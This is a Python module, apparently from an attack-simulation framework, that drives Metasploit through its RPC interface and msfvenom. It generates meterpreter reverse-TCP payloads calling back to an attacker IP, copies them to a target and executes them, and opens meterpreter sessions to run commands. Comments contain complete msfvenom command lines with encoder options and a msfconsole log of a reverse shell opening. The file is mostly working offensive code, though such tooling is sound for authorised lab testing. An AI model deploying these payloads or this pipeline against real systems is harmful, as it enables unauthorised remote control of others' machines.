#!/usr/bin/env python3

from pymetasploit3.msfrpc import MsfRpcClient
from app.machinecontrol import Machine
from app.attack_log import AttackLog
from app.interface_sfx import CommandlineColors
import time


import os

# https://github.com/DanMcInerney/pymetasploit3

# Requirements
# TODO Connect to metasploit on kali machine
# TODO Multi sessions
# Add msfvenom class to generate payloads and fetch them


class Metasploit():
    def __init__(self, password, **kwargs):
        """

        :param password: password for the msfrpcd
        :param kwargs: Relevant ones: uri, port, server, username
        """

        self.password = password
        self.kwargs = kwargs
        self.client = None

        # Optional attacker: If a running attacker machine is passed, we take it and start the msfrpcd
        # Alternative: The server is taken and we expect an already running msfrpcd there
        self.attacker = kwargs.get("attacker", None)
        if self.attacker:
            # we expect a running attacker but without a running msfrcpd
            self.start_msfrpcd(kwargs.get("username"))
            kwargs["server"] = self.attacker.get_ip()
            time.sleep(3)   # Waiting for server to start. Or we would get https connection errors when getting the client.

        self.get_client()
        # self.client = MsfRpcClient(password, **kwargs)
        # TODO: Improve speed and reliability with exception handling and retries
        # Waiting for reverse shell
        self.exploit_stub_for_external_payload()

        print("Meterpreter executing")
        print(self.meterpreter_execute("getuid", 0))
        print("Done")

    def exploit_stub_for_external_payload(self, exploit='exploit/multi/handler', payload='linux/x64/meterpreter_reverse_tcp'):
        exploit = self.client.modules.use('exploit', exploit)
        # print(exploit.description)
        # print(exploit.missing_required)
        payload = self.client.modules.use('payload', payload)
        # print(payload.description)
        # print(payload.missing_required)
        payload["LHOST"] = self.attacker.get_ip()
        res = exploit.execute(payload=payload)
        print(res)

    def start_msfrpcd(self, username):
        """ Starts the msfrpcs on the attacker. Metasploit must alredy be installed there ! """

        cmd = f"msfrpcd -P {self.password} -U {username} -S"

        self.attacker.remote_run(cmd, disown=True)

    def get_client(self):
        """ Get a local metasploit client connected to the metasploit server """
        if self.client:
            return self.client
        self.client = MsfRpcClient(self.password, **self.kwargs)
        return self.client

    def get_sid(self, number=0):
        """ Get the first session between hacked target and the metasploit server

        @param number: number of the session to get
        """

        # TODO improve stability and speed
        while len(self.client.sessions.list) <= number:
            # print(self.client.sessions.list)
            # print("Waiting for session")
            time.sleep(1)
        return list(self.client.sessions.list)[number]

    def meterpreter_execute(self, cmd: str, session_number: int) -> str:
        """ Executes a command on the meterpreter, returns result read from shell

        @param cmd: command to execute
        @param session_number: session number
        @:return: the string result
        """
        shell = self.client.sessions.session(self.get_sid(session_number))
        shell.write(cmd)
        return shell.read()

##########################################################################


class MSFVenom():
    def __init__(self, attacker: Machine, target: Machine, attack_logger: AttackLog):
        """

        :param attacker: attacker machine
        """
        # https://www.offensive-security.com/metasploit-unleashed/msfvenom/

        self.attacker = attacker
        self.target = target
        self.attack_logger = attack_logger

    def generate_cmd(self, **kwargs):
        """ Generates a cmd


        :return:
        """
        payload = kwargs.get("payload", None)
        architecture = kwargs.get("architecture", None)
        platform = kwargs.get("platform", self.target.get_os())
        lhost = kwargs.get("lhost", self.attacker.get_ip())
        format = kwargs.get("format", None)  # file format
        outfile = kwargs.get("outfile", "payload.exe")

        cmd = "msfvenom"
        if architecture is not None:
            cmd += f" -a {architecture}"
        if platform is not None:
            cmd += f" --platform {platform}"
        if payload is not None:
            cmd += f" -p {payload}"
        if lhost is not None:
            cmd += f" LHOST={lhost}"
        if format is not None:
            cmd += f" -f {format}"
        if outfile is not None:
            cmd += f" -o {outfile}"

        # -p payload  linux/x86/meterpreter_reverse_tcp
        # -f format: elf, exe, powershell, python
        # --platform: linux, windows, osx
        # -a arch: x86, x64
        # -e encoders: x86/shikata_ga_nai
        # -b bad chars to avoid
        # -i iterations. encoding iterations
        # -o <filename> out filename
        # root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python
        # complex: msfvenom -a x86 --platform linux -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.178.125 -e x86/shikata_ga_nai -i 3 -f elf -o reverse_meterpreter

        # verified to work (Linux): msfvenom -a x64 --platform linux -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.178.125  -f elf -o reverse_meterpreter

        # Keep in mind: The msfconsole needs to actively listen to the connection:
        # msf6 > use exploit/multi/handler
        # [*] Using configured payload generic/shell_reverse_tcp
        # msf6 exploit(multi/handler) > set payload linux/x64/meterpreter_reverse_tcp
        # payload => linux/x64/meterpreter_reverse_tcp
        # msf6 exploit(multi/handler) > set lhost 192.168.178.125
        # lhost => 192.168.178.125
        # msf6 exploit(multi/handler) > set lport 4444
        # lport => 4444
        # msf6 exploit(multi/handler) > run
        #
        # [*] Started reverse TCP handler on 192.168.178.125:4444
        # [*] Meterpreter session 1 opened (192.168.178.125:4444 -> 192.168.178.125:42436) at 2021-06-01 03:32:12 -0400
        #
        # meterpreter >   !!! We are in the session now !!!

        return cmd

    def generate_payload(self, **kwargs):
        """ Generates a payload on the attacker machine

        """
        cmd = self.generate_cmd(**kwargs)

        self.attacker.remote_run(cmd)

    def generate_and_deploy(self, **kwargs):
        """ Will generate the payload and directly deploy it to the target

        :return:
        """
        self.generate_payload(**kwargs)

        payload_name = kwargs.get("outfile", "payload.exe")

        self.attacker.get(payload_name, self.target.get_machine_path_external())
        src = os.path.join(self.target.get_machine_path_external(), payload_name)

        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Generated {payload_name}...deploying it{CommandlineColors.ENDC}",
            1)
        # Deploy to target
        self.target.put(src, self.target.get_playground())

        # TODO run on target
        if self.target.get_playground() is not None:
            cmd = f"cd {self.target.get_playground()};"
        else:
            cmd = ""
        cmd += f"chmod +x {payload_name}; ./{payload_name}"
        self.target.remote_run(cmd, disown=True)
        self.attack_logger.vprint(
            f"{CommandlineColors.OKCYAN}Executed payload {payload_name} on {self.target.get_name()} {CommandlineColors.ENDC}",
            1)
